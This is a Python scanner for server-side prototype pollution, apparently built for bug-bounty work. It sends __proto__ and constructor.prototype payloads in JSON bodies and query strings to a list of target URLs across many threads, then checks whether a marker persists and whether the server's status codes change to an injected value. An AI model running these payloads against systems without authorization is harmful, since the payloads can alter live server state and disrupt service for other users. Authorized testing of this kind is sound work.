#!/usr/bin/env python3
"""
proto_polluter.py — Server-Side Prototype Pollution Scanner
Injects __proto__ and constructor.prototype payloads into JSON endpoints,
then verifies pollution persists across requests.

Attacks:
  - JSON body: {"__proto__": {"polluted": "bb_test_12345"}}
  - JSON body: {"constructor": {"prototype": {"polluted": "bb_test_12345"}}}
  - Query param: ?__proto__[polluted]=bb_test_12345
  - Status code manipulation: {"__proto__": {"status": 510}}

Usage:
  python3 proto_polluter.py -i targets.txt -o findings.txt -t 20
  python3 proto_polluter.py -i targets.txt -o /dev/stdout --dry-run
"""

import argparse
import json
import random
import string
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urlencode, urlunparse, parse_qs

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DEFAULT_HEADERS = {
    "User-Agent": "noleak",
    "Content-Type": "application/json",
    "Accept": "application/json",
}
TIMEOUT = 10


def random_marker():
    """Generate a unique pollution marker."""
    return "bb_pp_" + "".join(random.choices(string.ascii_lowercase + string.digits, k=8))


def safe_request(method, url, headers=None, json_data=None, timeout=TIMEOUT):
    """Make an HTTP request with error handling."""
    hdrs = dict(DEFAULT_HEADERS)
    if headers:
        hdrs.update(headers)
    try:
        resp = requests.request(
            method, url, headers=hdrs, json=json_data,
            allow_redirects=False, timeout=timeout, verify=False
        )
        return resp.status_code, resp.headers, resp.text
    except requests.RequestException:
        return None, {}, ""


def safe_get(url, timeout=TIMEOUT):
    """Simple GET request."""
    try:
        resp = requests.get(
            url, headers={"User-Agent": "noleak", "Accept": "application/json"},
            allow_redirects=False, timeout=timeout, verify=False
        )
        return resp.status_code, resp.headers, resp.text
    except requests.RequestException:
        return None, {}, ""


def test_json_proto(url, marker):
    """Test __proto__ injection via JSON body."""
    findings = []

    # Payload 1: __proto__ direct
    payload1 = {"__proto__": {"polluted": marker}}
    status, headers, body = safe_request("POST", url, json_data=payload1)

    if status is None:
        # Try PUT
        status, headers, body = safe_request("PUT", url, json_data=payload1)

    if status is None:
        return findings

    # Check if the response itself reflects pollution
    if marker in body:
        findings.append(
            f"[P2:PROTO:HIGH] REFLECTED {url} | "
            f"__proto__ payload reflected in POST response | "
            f"status={status}"
        )

    # Check pollution persistence: clean GET after injection
    time.sleep(0.5)
    get_status, get_headers, get_body = safe_get(url)
    if get_status and marker in get_body:
        findings.append(
            f"[P2:PROTO:HIGH] SERVER_SIDE {url} | "
            f"__proto__ pollution confirmed (marker in GET after POST) | "
            f"inject_status={status} verify_status={get_status}"
        )

    return findings


def test_constructor_proto(url, marker):
    """Test constructor.prototype injection."""
    findings = []

    payload = {"constructor": {"prototype": {"polluted": marker}}}
    status, headers, body = safe_request("POST", url, json_data=payload)

    if status is None:
        status, headers, body = safe_request("PUT", url, json_data=payload)

    if status is None:
        return findings

    if marker in body:
        findings.append(
            f"[P2:PROTO:HIGH] CONSTRUCTOR_REFLECTED {url} | "
            f"constructor.prototype payload reflected | status={status}"
        )

    time.sleep(0.5)
    get_status, get_headers, get_body = safe_get(url)
    if get_status and marker in get_body:
        findings.append(
            f"[P2:PROTO:HIGH] CONSTRUCTOR_SERVER_SIDE {url} | "
            f"constructor.prototype pollution confirmed (marker in GET) | "
            f"inject_status={status} verify_status={get_status}"
        )

    return findings


def test_query_proto(url, marker):
    """Test __proto__ via query parameters."""
    findings = []
    parsed = urlparse(url)

    # Append __proto__[polluted]=marker to query
    proto_params = f"__proto__[polluted]={marker}"
    if parsed.query:
        new_query = f"{parsed.query}&{proto_params}"
    else:
        new_query = proto_params

    test_url = urlunparse((
        parsed.scheme, parsed.netloc, parsed.path,
        parsed.params, new_query, parsed.fragment
    ))

    status, headers, body = safe_get(test_url)
    if status is None:
        return findings

    if marker in body:
        findings.append(
            f"[P2:PROTO:HIGH] QUERY_PARAM {url} | "
            f"__proto__[polluted] via query param reflected | status={status}"
        )

    # Also test with constructor
    constructor_params = f"constructor[prototype][polluted]={marker}"
    if parsed.query:
        new_query2 = f"{parsed.query}&{constructor_params}"
    else:
        new_query2 = constructor_params

    test_url2 = urlunparse((
        parsed.scheme, parsed.netloc, parsed.path,
        parsed.params, new_query2, parsed.fragment
    ))

    status2, _, body2 = safe_get(test_url2)
    if status2 and marker in body2:
        findings.append(
            f"[P2:PROTO:HIGH] QUERY_CONSTRUCTOR {url} | "
            f"constructor[prototype][polluted] via query reflected | status={status2}"
        )

    return findings


def test_status_manipulation(url):
    """Test status code manipulation via prototype pollution."""
    findings = []

    # Inject a weird status code
    payload = {"__proto__": {"status": 510}}
    status, headers, body = safe_request("POST", url, json_data=payload)
    if status is None:
        return findings

    # Check if subsequent request returns the injected status
    time.sleep(0.5)
    get_status, _, _ = safe_get(url)
    if get_status == 510:
        findings.append(
            f"[P2:PROTO:HIGH] STATUS_MANIPULATION {url} | "
            f"__proto__.status=510 changed GET response status | "
            f"Server-side pollution confirmed"
        )

    # Try injecting statusCode
    payload2 = {"__proto__": {"statusCode": 510}}
    safe_request("POST", url, json_data=payload2)
    time.sleep(0.5)
    get_status2, _, _ = safe_get(url)
    if get_status2 == 510:
        findings.append(
            f"[P2:PROTO:HIGH] STATUS_CODE_MANIPULATION {url} | "
            f"__proto__.statusCode=510 confirmed"
        )

    return findings


def test_content_type_detect(url):
    """Quick check if the endpoint accepts JSON."""
    status, headers, body = safe_request("POST", url, json_data={"test": 1})
    if status is None:
        return False

    # If we get a response that isn't an error about content type, it accepts JSON
    ct = headers.get("Content-Type", "")
    if "json" in ct.lower():
        return True
    if status in (200, 201, 204, 400, 401, 403, 422):
        return True
    return False


def test_endpoint(url):
    """Run all prototype pollution tests on a single endpoint."""
    all_findings = []
    marker = random_marker()

    # Quick check: does it accept JSON?
    if not test_content_type_detect(url):
        return all_findings

    # Run all attack vectors
    all_findings.extend(test_json_proto(url, marker))

    marker2 = random_marker()
    all_findings.extend(test_constructor_proto(url, marker2))

    marker3 = random_marker()
    all_findings.extend(test_query_proto(url, marker3))

    all_findings.extend(test_status_manipulation(url))

    return all_findings


def main():
    parser = argparse.ArgumentParser(
        description="Server-Side Prototype Pollution Scanner"
    )
    parser.add_argument(
        "-i", "--input", required=True,
        help="Input file with target URLs (one per line)"
    )
    parser.add_argument(
        "-o", "--output", required=False,
        help="Output file for findings (optional)"
    )
    parser.add_argument(
        "-t", "--threads", type=int, default=20,
        help="Number of threads (default: 20)"
    )
    parser.add_argument(
        "--dry-run", action="store_true",
        help="Show targets without testing"
    )
    args = parser.parse_args()

    # Load URLs
    try:
        with open(args.input, "r") as f:
            urls = [line.strip() for line in f if line.strip() and line.strip().startswith("http")]
    except (IOError, PermissionError) as e:
        print(f"[ERROR] Cannot read input: {e}", file=sys.stderr)
        sys.exit(1)

    if not urls:
        print("[*] No URLs to test")
        return

    print(f"[*] Loaded {len(urls)} target endpoint(s)")

    if args.dry_run:
        for url in urls:
            print(f"[DRY-RUN] {url}")
        return

    # Test endpoints
    lock = threading.Lock()
    completed = [0]
    all_findings = []

    def process_url(url):
        findings = test_endpoint(url)
        with lock:
            completed[0] += 1
            if completed[0] % 25 == 0 or findings:
                print(f"[*] Progress: {completed[0]}/{len(urls)} endpoints tested")
            for f in findings:
                print(f"  {f}")
                all_findings.append(f)

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = {executor.submit(process_url, url): url for url in urls}
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                print(f"  [ERROR] {futures[future]}: {e}")

    # Write output
    if args.output and all_findings:
        try:
            with open(args.output, "w") as f:
                for line in all_findings:
                    f.write(line + "\n")
            print(f"\n[*] Wrote {len(all_findings)} finding(s) to {args.output}")
        except (IOError, PermissionError) as e:
            print(f"[ERROR] Cannot write output: {e}", file=sys.stderr)

    print(f"\n[*] Scan complete: {len(urls)} endpoints, {len(all_findings)} findings")


if __name__ == "__main__":
    main()
